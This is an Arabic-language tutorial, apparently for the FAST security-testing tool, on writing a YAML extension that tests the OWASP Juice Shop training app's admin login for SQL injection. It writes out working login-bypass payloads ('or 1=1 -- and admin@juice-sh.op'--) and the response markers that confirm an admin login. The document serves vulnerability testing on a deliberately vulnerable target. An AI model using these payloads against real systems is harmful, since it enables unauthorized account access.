[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project

#   إنشاء تمديد تعديل

التمديد الموصوف في هذه الوثيقة سيُعدل طلب الأساس الوارد لإدخال بعض الحمولات إليه. هذه الحمولات يمكن أن تؤدي إلى استغلال ضعف SQLi في نموذج تسجيل الدخول لتطبيق الهدف الخاص ب[”OWASP Juice Shop“][link-juice-shop].
  
##  الاستعدادات

يُنصح بشدة باتخاذ هذه الخطوات قبل إنشاء تمديد FAST:
1.  [التحري عن سلوك تطبيق الهدف][link-app-examination] الذي تقوم بإنشاء التمديد له.
2.  [قراءة مبادئ بناء النقاط لتمديد][link-points].


##  بناء التمديد

إنشاء ملف يصف التمديد (على سبيل المثال، `mod-extension.yaml`) واملأه بالأقسام المطلوبة:

1.  [**قسم `meta-info`**][link-meta-info].

    إعداد وصف الضعف الذي سيحاول التمديد الكشف عنه.
    
    * عنوان الضعف: `OWASP Juice Shop SQLi (mod extension)`
    * وصف الضعف: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * نوع الضعف: حقن SQL
    * مستوى تهديد الضعف: عالي
    
    يجب أن يبدو قسم `meta-info` المقابل كما يلي:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **قسم `collect`, مرحلة [Collect][doc-collect-phase]**.
    
    يتم استدعاء طريقة REST API `POST /rest/user/login` عند محاولة تسجيل الدخول.
    
    لا حاجة لإنشاء طلبات اختبار لكل واحد من طلبات الأساس لتسجيل الدخول التي أُرسلت إلى الواجهة البرمجية للتطبيق نظرًا لأن الاختبار للضعف سيتم بنفس الطريقة لكل قطعة من البيانات المرسلة في الطلب POST.
    
    قم بإعداد التمديد بحيث يتم تشغيله مرة واحدة عندما تتلقى الواجهة البرمجية للتطبيق الطلب لتسجيل الدخول. للقيام بذلك، أضف مرحلة Collect بشرط الفريد للتمديد.

    يتكون الطلب `/rest/user/login` إلى الواجهة البرمجية للتطبيق لتسجيل الدخول من:

    1.  الجزء الأول من المسار بقيمة `rest`,
    2.  الجزء الثاني من المسار بقيمة `user`, و
    3.  طريقة العمل `login`
    
    النقاط المتوافقة التي تشير إلى هذه القيم هي التالية:

    1.  `PATH_0_value` للجزء الأول من المسار
    2.  `PATH_1_value` للجزء الثاني من المسار
    3.  `ACTION_NAME_value` لطريقة العمل `login`
    
    إذا أضفت الشرط بأن مجموعة هذه العناصر الثلاثة يجب أن تكون فريدة، عندها سيتم تشغيل التمديد فقط لأول طلب أساس `/rest/user/login` إلى الواجهة البرمجية للتطبيق (سيتم التعامل مع مثل هذا الطلب على أنه فريد، وجميع الطلبات التالية إلى الواجهة البرمجية للتطبيق لتسجيل الدخول لن تكون فريدة). 
    
    أضف القسم `collect` المقابل إلى ملف YAML للتمديد. 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **قسم `match`, مرحلة [Match][doc-match-phase]**.
    
    من الضروري التحقق مما إذا كانت طلبات الأساس الواردة هي فعلاً طلب إلى الواجهة البرمجية للتطبيق لتسجيل الدخول، لأن التمديد الذي نقوم بإنشائه سيستغل الضعف الذي يحتويه نموذج تسجيل الدخول.
    
    قم بإعداد التمديد بحيث يتم تشغيله فقط إذا كان طلب الأساس موجهًا إلى الرابط التالي: `/rest/user/login`. أضف مرحلة Match التي تتحقق مما إذا كان الطلب الوارد يحتوي على العناصر المطلوبة. يمكن القيام بذلك باستخدام القسم `match` التالي:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **قسم `modify`, مرحلة [Modify][doc-modify-phase]**.
    
    دعونا نفترض أنه من المطلوب تعديل طلب الأساس لتحقيق الأهداف التالية:
    * إفراغ قيمة رأس HTTP الخاص بـ `Accept-Language` (هذه القيمة ليست مطلوبة لاكتشاف الضعف).
    * استبدال القيم الحقيقية لمعلمات `email` و `password` بالقيم المحايدة `dummy`.
    
    أضف إلى التمديد قسم `modify` التالي الذي يغير الطلب لتحقيق الأهداف المذكورة أعلاه:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "بناء النقاط وصف عناصر الطلب"
        نظرًا لأن بيانات الطلب الموجودة في تنسيق JSON مخزنة في أزواج `<key: value>`, سيظهر النقطة التي تشير إلى قيمة عنصر `email` كما هو موضح أعلاه. النقطة التي تشير إلى قيمة عنصر `password` لها هيكل مماثل.
        
        لرؤية معلومات مفصلة حول بناء النقاط، تابع إلى هذا [الرابط][link-points].
 
5.  **قسم `generate`, مرحلة [Generate][doc-generate-phase]**.

    من المعروف أن هناك حمولتين يجب استبدال قيمة معلمة `email` في طلب الأساس بهما لاستغلال ضعف حقن SQL في تطبيق الهدف:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "إدخال الحمولة في الطلب المعدل"
        سيتم إدخال الحمولة في الطلب المعدل مسبقًا لأن التمديد يحتوي على قسم `modify`. بالتالي، بعد إدخال الحمولة الأولى في حقل `email`, يجب أن يبدو بيانات الطلب الاختباري كما يلي:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        نظرًا لأنه يمكن استخدام أي كلمة مرور لتسجيل الدخول بنجاح بسبب الحمولات المختارة، فليس من الضروري إدخال الحمولة في حقل كلمة المرور، والذي سيكون له قيمة `dummy` بعد تطبيق مرحلة Modify.
    
        أضف قسم `generate` الذي سينشئ الطلبات الاختبارية التي تفي بالمتطلبات المذكورة أعلاه.
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **قسم `detect`, مرحلة [Detect][doc-detect-phase]**.
    
    الشروط التالية تشير إلى أن المصادقة بحقوق المسؤول كانت ناجحة:
    * وجود معلمة معرف عربة التسوق بقيمة `1` في جسم الاستجابة. المعلمة بتنسيق JSON ويجب أن تبدو بالطريقة التالية:
    
        ```
        "bid":1
        ```
    
    * وجود معلمة بريد المستخدم بقيمة `admin@juice-sh.op` في جسم الاستجابة. المعلمة بتنسيق JSON ويجب أن تبدو بالطريقة التالية:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    أضف قسم `detect` الذي يتحقق مما إذا كان الهجوم ناجحًا وفقًا للشروط المذكورة أعلاه.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "هروب الرموز الخاصة"
    تذكر هروب الرموز الخاصة في السلاسل.

##  ملف التمديد

الآن يحتوي ملف `mod-extension.yaml` على مجموعة كاملة من الأقسام المطلوبة لتشغيل التمديد. قائمة محتويات الملف أدناه:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  استخدام التمديد

للحصول على معلومات مفصلة حول كيفية استخدام التعبير الذي تم إنشاؤه، اقرأ [هذه الوثيقة][link-using-extension].